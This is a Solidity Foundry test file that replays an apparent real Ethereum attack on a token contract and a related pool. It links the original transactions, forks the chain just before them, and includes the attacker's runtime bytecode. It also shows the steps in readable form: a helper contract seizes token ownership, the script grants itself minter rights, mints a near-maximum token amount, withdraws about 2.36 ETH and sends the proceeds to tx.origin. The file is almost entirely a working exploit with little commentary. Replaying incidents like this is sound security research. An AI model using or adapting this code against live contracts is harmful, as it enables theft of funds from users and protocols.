// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x4d5177755d6c6fd7a74b66217270420b7ad1d1df60c346993147da74dc3b4ea0
// https://etherscan.io/address/0x98536DBdC45f48b53612Bfb0A8892B5501E7e9e7

interface I {
    function withdraw(uint256) external payable;
    function transfer(address, uint256) external payable;
    function mint(address, uint256) external payable;
    function totalSupply() external payable returns (uint256);
    function addMinter(address) external payable;
    function balanceOf(address) external payable returns (uint256);
    function transferOwnership(address) external payable;
}

contract X9703 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x4d5177755d6c6fd7a74b66217270420b7ad1d1df60c346993147da74dc3b4ea0");
    }

    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x85bc = 0x85Bc06f4e3439d41f610a440Ba0FbE333736B310;
    address constant x9e52 = 0x9e52dB44d62A8c9762FA847Bd2eBa9d0585782d1;

    address xe76f;

    function test1() public {
        // vm.startPrank(0x98536DBdC45f48b53612Bfb0A8892B5501E7e9e7, 0x98536DBdC45f48b53612Bfb0A8892B5501E7e9e7);

        vm.createSelectFork("http://localhost:18545", 18041975); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xb5e5d1802810a10866340c206e8f709a649d452e5f26b4104844970dc11247c3));

        // https://explorer.phalcon.xyz/tx/eth/0xb5e5d1802810a10866340c206e8f709a649d452e5f26b4104844970dc11247c3
        this.xb5e5d180();
        // https://explorer.phalcon.xyz/tx/eth/0x4d5177755d6c6fd7a74b66217270420b7ad1d1df60c346993147da74dc3b4ea0
        execute(x9e52, x85bc);
    }

    function test2() public {
        // vm.startPrank(0x98536DBdC45f48b53612Bfb0A8892B5501E7e9e7, 0x98536DBdC45f48b53612Bfb0A8892B5501E7e9e7);

        vm.createSelectFork("http://localhost:18545", 18041957); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xb5e5d1802810a10866340c206e8f709a649d452e5f26b4104844970dc11247c3
        this.xb5e5d180();
        vm.warp(1693574603);
        vm.roll(18041975);
        // https://explorer.phalcon.xyz/tx/eth/0x4d5177755d6c6fd7a74b66217270420b7ad1d1df60c346993147da74dc3b4ea0
        execute(x9e52, x85bc);
    }

    function xb5e5d180() public {
        _constructor_();
    }

    function execute(address, address) public {
        xe76f = address(new Xe76f(r));
        I(x9e52).addMinter(r);
        // uint256 v1 = 102359927199999900000;
        uint256 v1 = I(x9e52).totalSupply();
        console2.log("I(x9e52).totalSupply()\t->", "102359927199999900000 (102.3599 ether)");
        I(x9e52).mint(r, 115792089237316195423570985008687907853269984665640564039355224080713129739935);
        I(x85bc).withdraw(2359927199999900000);
        address(tx.origin).call{value: 2359927199999900000}("");
        // uint256 v2 = 115792089237316195423570985008687907853269984665640564039352864153513129839935;
        uint256 v2 = I(x9e52).balanceOf(r);
        console2.log(
            "I(x9e52).balanceOf(r)\t\t->",
            "115792089237316195423570985008687907853269984665640564039352864153513129839935 (115792089237316195423570985008687907853269984665640564039352.8641 ether)"
        );
        I(x9e52).transfer(tx.origin, v2);
    }

    function call() public payable {}

    function _constructor_() public {
        bytes memory rt =
            hex"60806040526004361061001d575f3560e01c8063d80aea151461001f575b005b61001d61002d366004610424565b8160405161003a906103f0565b73ffffffffffffffffffffffffffffffffffffffff9091168152602001604051809103905ff080158015610070573d5f803e3d5ffd5b50506040517f983b2d5600000000000000000000000000000000000000000000000000000000815230600482015273ffffffffffffffffffffffffffffffffffffffff83169063983b2d56906024015f604051808303815f87803b1580156100d6575f80fd5b505af11580156100e8573d5f803e3d5ffd5b505050508173ffffffffffffffffffffffffffffffffffffffff166340c10f19308473ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610152573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101769190610455565b6101a0907fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff61046c565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b16815273ffffffffffffffffffffffffffffffffffffffff909216600483015260248201526044015f604051808303815f87803b158015610208575f80fd5b505af115801561021a573d5f803e3d5ffd5b50506040517f2e1a7d4d00000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff8416803160048301529250632e1a7d4d91506024015f604051808303815f87803b158015610283575f80fd5b505af1158015610295573d5f803e3d5ffd5b50506040513392504780156108fc029250905f818181858888f193505050501580156102c3573d5f803e3d5ffd5b506040517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015273ffffffffffffffffffffffffffffffffffffffff83169063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610336573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061035a9190610455565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b16815273ffffffffffffffffffffffffffffffffffffffff909216600483015260248201526044016020604051808303815f875af11580156103c7573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103eb91906104aa565b505050565b60cb806104d183390190565b803573ffffffffffffffffffffffffffffffffffffffff8116811461041f575f80fd5b919050565b5f8060408385031215610435575f80fd5b61043e836103fc565b915061044c602084016103fc565b90509250929050565b5f60208284031215610465575f80fd5b5051919050565b818103818111156104a4577f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b92915050565b5f602082840312156104ba575f80fd5b815180151581146104c9575f80fd5b939250505056fe6080604052348015600e575f80fd5b5060405160cb38038060cb8339810160408190526029916080565b60405163f2fde38b60e01b81523360048201526001600160a01b0382169063f2fde38b906024015f604051808303815f87803b1580156066575f80fd5b505af11580156077573d5f803e3d5ffd5b505050505060ab565b5f60208284031215608f575f80fd5b81516001600160a01b038116811460a4575f80fd5b9392505050565b60158060b65f395ff3fe60806040525f80fdfea164736f6c6343000815000aa164736f6c6343000815000a";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xe76f {
    address immutable r = address(this);
    receive() external payable {}
    address constant x9e52 = 0x9e52dB44d62A8c9762FA847Bd2eBa9d0585782d1;

    address x9703;

    constructor(address a_x9703) payable {
        x9703 = a_x9703; // 0x97032BE66EC5CE3Bc2D89dA5A0F3D6e632d00519
        I(x9e52).transferOwnership(x9703);
    }

    fallback() external payable {
        revert("no such function");
    }
}
